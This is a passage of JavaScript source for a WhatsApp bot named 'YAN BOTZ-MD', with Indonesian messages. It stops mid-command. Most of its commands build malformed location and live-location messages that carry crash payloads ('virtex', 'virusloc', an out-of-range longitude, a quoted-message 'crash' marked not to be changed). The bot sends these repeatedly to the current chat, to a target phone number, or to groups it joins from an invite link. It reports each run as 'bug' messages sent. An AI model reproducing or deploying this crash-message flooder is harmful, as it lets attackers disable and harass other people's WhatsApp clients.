Z61PJ2yNvDI0+nXqXqX0dk9kWjLBpBuQhgcEEEeYpr9moWs7i2+sMGbVjqmTDjHjDd3jdz0xu/CqvavQbqW5F3psjyTXesWdwdsO4W4jQIWPPiAxk9PT304J+SMkvbCDcqXWnT296t/DYSwSFS0Zl5R8gkFcc8VHf9qrWymv4jbTPJBex2aAOoEkki7xycBR15NQT9lbi5juri51JDq8t5DerMsBESNDwibN2SMZzz50L2avBDqjy6pby3N5cRXEqvZAwOANvdshYkqcDzB4FOB8jYdIuH1G0Mz2lxZursjRTqAcjzBHDKfIjg0VV7K6WNB0xrUzCUvK8xEamOOPcc7EXJwo9M0VVll1yZKJ2m7+GQ5VVBDedRW0hkQlsZBxxRRQkf/wCpAP8Adbc/v4z+gp1FFAJHg3AQgFXUgj4VLNbpHBMVLcgdTnoelFFAVbeRpYdzYB91WrSKNoY5e7UNjPHTPrRRQGNlv7hJWUsHX0ZRVmxdbk+OGJT6oMGiijBIo2s6jOFYgZOahuHKttGMSgK2fd6fOiigJ6KKKA//2Q=="
}
}), { userJid: m.chat, quoted: fdocjo })
jobotz.relayMessage(tosendgc, liveLocation.message, { messageId: liveLocation.key.id })
}
repjo(`Sukses`)
}
break

case 'joliveloc': {
if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) {
var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9366881,
"degreesLongitude": 107.7228148,
"caption":`YAN BOTZ-MD ${philips} ${ngazap(prefix)}`,
"sequenceNumber": "1657997490287001",
"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAIQAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIAGQAZAMBIgACEQEDEQH/xAAcAAABBAMBAAAAAAAAAAAAAAAAAQIDBAUGBwj/xAA7EAACAQMDAQUECAQGAwAAAAABAgMABBEFEiExBhMiQVEjYXGRFBUygaGxwfAHUtHhJDNCU4LxQ0Ri/8QAGwEBAAMBAQEBAAAAAAAAAAAAAAECAwQFBgf/xAAmEQACAgEEAQMFAQAAAAAAAAAAAQIRAwQSITFRBQYiEzJBcbGB/9oADAMBAAIRAxEAPwD0GunXj/5t1HGPSKPJ+ZP6VdtLaO1tp1XeyP4TvYsXb1zVknAJPQUwD/JU9VTefix/7rkwaDBglugufLbf96/w1yZ55FTfA2K3ijjRFjUBVCjipaKK7bsxCiimTzRW8TSzyJFEvLO7BQPiTUAnHSoXeRLWARsUPclunmAP61Rtdc0u9Zo7HUrG5kAOUhnVz8gayjQybYSqqwVNpBOPT+lYQi0m0aSTTqSoZctJ3jZjVo+Mbo9w6e6ltVR45D3apnKErxxj8Kj7uWPokyAfytkfLP6Uomd7WQFwwJEatjBOev4VuZiW74Cny8skA48vwqnpthZ6Wpjsxb/Sd3t3jHtCGyV3EksegGSecVe6VqfaS4GmapK8d7eWsV2gnnKPDGhcARr43BYZ2qDjpkHjNSQzbaKhsCrafatEZnjaJWVp2LOQRnxE+fNFQSPZe8IiHV+D7h5mnEiWZngkR93+k8Hj09ar3kvcWl5MOqR7R8T+xUkUQW3jjcBtqgc+4VNcWRfNDyWX7cci/wDHP5UgkQnAYZ9M80Bdv2Gdfgx/KnFpSMF1cejoD+WKgkZPMlvBJNMwWKNS7MfIAZJrzr2u7S3ev6i89y7R26MTFCTxEP6+p+PlgDvevWbX+hajZxQxrJcW0kSsjFcFlIHH315kv4WkSWLxIx4wwwQfQ15vqE5JKK6Z9V7YwY5ynkkrkuggu0kb2UuWU7vv9a7f/C7tLNrttNaak5lu7ZRslY+J4/efMg+fnkdTk1wCws5YrjvJMKBnzzmutfwVtX+ub2+YlYY7cw5PQszKR9/gPzHrXNo5OOVRi+Get67ihl0UsmVVJdHYoyUmi8bhS2DliR0Pr78UNBIsjttAXcz7mfCj3/HFKQGGDgg0IALOUbwgZtvPIA6Y/frXtn5+M3D/AHo/uUmsP2jtbm5S0ksIIriaJyGlEMfeopH/AI+98Oc4rMK2XADBxjqFIx86enFxF78gfHH9jQdmK0W6OmWCwzxa3cyMzSFriHe65JwpKZXgAdOPniirTXTRBRxkjJyfM9fxoqSBL0g28EZGe/myR6gHH5VcqvJFuvolJ8NvGBj/AOiOvyz86sVL6SC7YUUUVUkK4z/Fvs39C1D61s4z9HuG9sAOEk65+Dcn4g+ors1Y7X9LTWdMudPbg3CEBvJSOQ2PccGsc+JZYOLO707Wy0WeOVdfn9Hm2xtZr27htrZDJNKwRFHmScD/ALr0X2X0dezuiwWNswZ+DKSOJJDgE+uPIc8AD0rmn8GNMS41m7v5UI+ixr3YbyZ8jPxAVh/yrsQIEu88iJS5+PQfrXLoMO2O99s9f3Hr3mzLBH7Y/wBYFAGIaFkOcbojwfupfZLE0bySZLbt3dkfpWo6YCt/26DcMHViD77frWI0TUtWFhpmn6bc21vDD2fjviZbfvSWDMMDkYzgeteltPmN50XbHtz9IfHX7P8AakHdB1Y3OdpB+zWitrl9ciXU7G3tlvvqCC9Ps8lvaOXQHrjAOB61Lf8Aa+4azvLyxSOWznvodPsj3BkIJTMjlV5fqQAPMYqNrG9G5tGneyhgDhj+PP60Vrej65qUkdwL/Sby5dJSsdwLSS371NqkEowyDkkenFFKZO5Gajuz9YzQzLtEjFoX8nA6j48VdqhqMHeSWJQf4cS94c9VKg8fOrrbgAXdIgegYZY/dVpVSaIjdtMdRQqO+O7ZHU/6um34ilMcw6IJAehQj9aoWEojfu0M23cznagzjj95/Cju5X8G0JngksMgUjMrzNtxsj8Cj09f37qAx2laRpukd/8AVsX0Pv33yB8spPuJPA9BnHurIMpVNrFS0rZO05G0f3/Oldtqk4z6D1pFhZHIXuWk/wBSr4WH9ahJLhFpScncnbNV7Ujsqur7daM6X80CtItutx7WLJUb+6GGHBHNZqwtdIv0j1HT4opo5bT6GkkLMF7gE+AAHAwc+WR0rAagmpt/EsDSpLSCX6nTvDdRs4C9+/QKw56edYjWrObQ10axluon06Y3E1xNPcSWcUk7HcAzICVGCdq9Dj3VejG65o32x0ixsXja0tNhS2WzGWZh3SkkLgk+ZPPWqp0PSbbRPq1rILpMCPJ3YZsqQd+4NncGznnOa0rS7WTUtTsLXVb6W8QaJNJ3lvcSqshFxhGJ8JbCkckckZ5qnFfpeWGnHtJfTxwNou+0b6Q8Yln3MCSVI3Pjbwc9enNTQ3LwbnpmoaFp2n27wJeSR3kYuhJJFNcO+4YyzeLnw9M0VznWbqeDTOzawzSxqdJhOEcgZy1FTssr9SjslmZILeQzuJSDkEqAN58h7ulSRRmSYqWOcbnYdfcPz+VPVg4WO3ZSo4KSL9seuaVhGqMIoy8WfGUY7gRWbduzZKhsZghmYtJmT7O5lwF+NRzMs0rFsupOEUDIIHniprx4h3bP3ilhw6r5ehzTU9nFJMsgckbEO3GDn9/KgGxr3CSShAjt4EGMff8Av0pGJY+1jWQ/zA7WpXZtpEgWVBz4+CPgaRtqNxuC7A5DHO2gCM4O+TkRLuPvbyH791EcQfAlAYk5PxowQscZ+0fav+g/fpUkf2xQGt6X2t0+bQrG/v7mHThewSOkE027G1tvBwM/3rIy61pNpplvPeajZJb3jAxO0g2yAY6fr6ZrWeyfZ/UtPk7Kve2yxixtLmOcmRD3bu+VHB5yPSoNA0XWNA+prubS3vDFbXNrJbpLHmEvOXV8k4wV4ODwKtSKKUjP6V2rtJ+yWn6tq1zb6ebokhXk4OGIIGeTwKu6j2g0uySBrvU7ONZU76JnfIZf5lx16+VanoGjar2fj0G4m097uW2sZbSW1ikjLxM0u5XGSAQQMHB8/jVvsr2dv9O1XR5LuJO6gs7iOXY6lYXkl3iMeZwDjIGOKNIJyNyt5hdW8c8F7HJDIoZHRcqwPQg5ormUfYHWrvRtHRtR+rpra17mSDvM+LvHbOVyOjDz8qKbV5G6Xg6dFuCNJGgeTds2/wAq5/f4UhIR3jtx3ahuWByTx0+FKMpMsW4hYx3srDjJ9Kaz94d0sXJ6FDhh/WqlwZ5EVmL7/VWGQaknVB3cSNHGy+LYeAc+/wCdNiRWIfvQ0SHc2Rhhj1/OmuyyndNAfF5o3OPeKAHSRsRtG43EAnqMefIpJPaSv6O4QfAcH8jUneYeWdZSyhf8s5GDxjimQ4jdS2SIkLn49P60Bodl2p1DVNavdAtbtI9SOpXCm4aNP8PaxtwFBGGcgEDIPmTWw6r2lh0zUlt7qzuhb95HC10zIoLNgAhMhmXJGSB61VbshF9Du1jvDFfSajJqVvdpDhoHYg7cZ8QxkHkZBqtqfY6S8u72V9StljubiK6dms90odNvhD7+E8PA8s/HNuDP5IluO2Mcck5bSL97SC/awadHjIaVWwAFLA8n4AZ61PJ2yNvDI0+nXqXqX0dk9kWjLBpBuQhgcEEEeYpr9moWs7i2+sMGbVjqmTDjHjDd3jdz0xu/CqvavQbqW5F3psjyTXesWdwdsO4W4jQIWPPiAxk9PT304J+SMkvbCDcqXWnT296t/DYSwSFS0Zl5R8gkFcc8VHf9qrWymv4jbTPJBex2aAOoEkki7xycBR15NQT9lbi5juri51JDq8t5DerMsBESNDwibN2SMZzz50L2avBDqjy6pby3N5cRXEqvZAwOANvdshYkqcDzB4FOB8jYdIuH1G0Mz2lxZursjRTqAcjzBHDKfIjg0VV7K6WNB0xrUzCUvK8xEamOOPcc7EXJwo9M0VVll1yZKJ2m7+GQ5VVBDedRW0hkQlsZBxxRRQkf/wCpAP8Adbc/v4z+gp1FFAJHg3AQgFXUgj4VLNbpHBMVLcgdTnoelFFAVbeRpYdzYB91WrSKNoY5e7UNjPHTPrRRQGNlv7hJWUsHX0ZRVmxdbk+OGJT6oMGiijBIo2s6jOFYgZOahuHKttGMSgK2fd6fOiigJ6KKKA//2Q=="
}
}), { userJid: m.chat, quoted: fdocjo })
jobotz.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.id })
}
buttonjo(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case 'jadiliveloc':{
if (!isCreator && !isBan) return 
if (!m.quoted && !text) throw `Teks/Reply`
var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9366881,
"degreesLongitude": 107.7228148,
"caption": `YAN BOTZ-MD ${philips} ${ngazap(prefix)}`,
"sequenceNumber": "1657997490287001",
"jpegThumbnail": "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"
}
}), { userJid: m.chat, quoted: fdocjo})
jobotz.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.id })
buttonjo(`Sukses Convert To liveloc`)
}
break
case 'jolivelocv2':
if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) {
res = generateWAMessageFromContent(m.chat,{
"liveLocationMessage": {
"degreesLatitude": -7.8374838,
"degreesLongitude": 727.8383838,
"caption": `YAN BOTZ-MD ᥬ🤫᭄\n\n${philips} ${virtex3}`,
"sequenceNumber": "1532280505",
"thumbnail": virgam,
"contextInfo": {
"forwardingScore": 150,
"isForwarded": true
}
}
}, {quoted: {key : {
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { //INI GUA KASIH QUOTED CRASH JANGAN DI GANTI 
liveLocationMessage: {
caption: `By: YAN BOTZ-MD`,
jpegThumbnail: fs.readFileSync(`./src/gambar/jo.jpg`), 
}
}
}, contextInfo:{}}) 
jobotz.relayMessage(m.chat, res.message, { messageId: res.key.id,})
}
buttonjo(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case 'jogasbugloc': {
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./src/gambar/jo.jpg') }, { upload: jobotz.waUploadToServer })
var location = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"locationMessage": {
"degreesLatitude": -6.936928157735237,
"degreesLongitude": 107.72270679473877,
"caption": `© 𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃${philips} ${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: fkonjo })
jobotz.relayMessage(`${text}@s.whatsapp.net`, location.message, { messageId: location.key.id })
jobotz.relayMessage(m.chat, location.message, { messageId: location.key.id })
buttonjo(`Berhasil Mengirim Bugloc Di Nomer ${text}`)
}
break
case 'jobuglocto': {
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./src/gambar/jo.jpg') }, { upload: jobotz.waUploadToServer })
var location = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"locationMessage": {
"degreesLatitude": -6.936928157735237,
"degreesLongitude": 107.72270679473877,
"caption": `© 𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃${philips} ${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: fkonjo })
jobotz.relayMessage(`${text}@s.whatsapp.net`, location.message, { messageId: location.key.id })
await repjo(`Berhasil Mengirim Bugloc Di Nomer ${text}`)
}
break
case 'jadilokas':{
if (!isCreator && !isBan) return 
if (!m.quoted && !text) throw `Teks/Reply`
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./src/gambar/jo.jpg') }, { upload: jobotz.waUploadToServer })
var location = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"locationMessage": {
"degreesLatitude": -6.936928157735237,
"degreesLongitude": 107.72270679473877,
"caption": `${text} ${virusloc} ${philips} ${ngazap(prefix)}`,
"jpegThumbnail": virgam,
}
}), { userJid: m.chat, quoted: fkonjo})
jobotz.relayMessage(m.chat, location.message, { messageId: location.key.id })
buttonjo(`Sukses Convert Lokas`)
}
break

case 'lokasgc': {
if (!isCreator && !isBan) return
if (!q) return repjo(`Linkgc mana?\nContoh: ${prefix+command} (linkgroup)`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) repjo(`Masukkan linkgc yg valid`)
let result = args[0].split('https://chat.whatsapp.com/')[1]
jumlah = '5'
for (let i = 0; i < jumlah; i++) {
let tosendgc = await jobotz.groupAcceptInvite(result)
var messa = await prepareWAMessageMedia({ image: virgam }, { upload: jobotz.waUploadToServer })
var location = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"locationMessage": {
"degreesLatitude": -6.936928157735237,
"degreesLongitude": 107.72270679473877,
"caption": `© 𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃${virusloc} ${philips} ${ngazap(prefix)}`,
"jpegThumbnail": virgam,
}
}), { userJid: m.chat, quoted: fdocjo })
jobotz.relayMessage(tosendgc, location.message, { messageId: location.key.id })
}
repjo(`Sukses`)
}
break

case 'jolokas': {
if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: virgam }, { upload: jobotz.waUploadToServer })
var location = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"locationMessage": {
"degreesLatitude": -6.936928157735237,
"degreesLongitude": 107.72270679473877,
"caption": `© 𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃${virusloc} ${philips} ${ngazap(prefix)}`,
"jpegThumbnail": virgam,
}
}), { userJid: m.chat, quoted: fdocjo })
jobotz.relayMessage(m.chat, location.message, { messageId: location.key.id })
}
buttonjo(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break

case 'lokasv2': {
if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) {
jobotz.sendMessage(m.chat, { location: {
degreesLatitude: -6.936928157735237,
degreesLongitude: 107.72270679473877,
caption: `© 𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃 ${thejo} ${virusloc}`,
jpegThumbnail: virgam,
}, 
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"contextInfo": {
"forwardingScore": 150,
"isForwarded": true
}
}},caption: captijo}, {quoted: fkonjo, contextInfo:{}})
}
buttonjo(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break

case 'jobugloc': {
if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: virgam }, { upload: jobotz.waUploadToServer })
var location = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"locationMessage": {
"degreesLatitude": -6.936928157735237,
"degreesLongitude": 107.72270679473877,
"caption": `© 𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃${philips} ${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: fkonjo })
jobotz.relayMessage(m.chat, location.message, { messageId: location.key.id })
}
buttonjo(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case 'jadibugloc':{
if (!isCreator && !isBan) return 
if (!m.quoted && !text) throw `Teks/Reply`
var messa = await prepareWAMessageMedia({ image: virgam }, { upload: jobotz.waUploadToServer })
var location = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"locationMessage": {
"degreesLatitude": -6.936928157735237,
"degreesLongitude": 107.72270679473877,
"caption": `Location ${text} ${philips} ${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: fkonjo })
jobotz.relayMessage(m.chat, location.message, { messageId: location.key.id })
buttonjo(`Sukses Convert Bugloc`)
}
break
case 'jobuginviteto': {
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./src/gambar/jo.jpg') }, { upload: jobotz.waUploadToServer })
var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
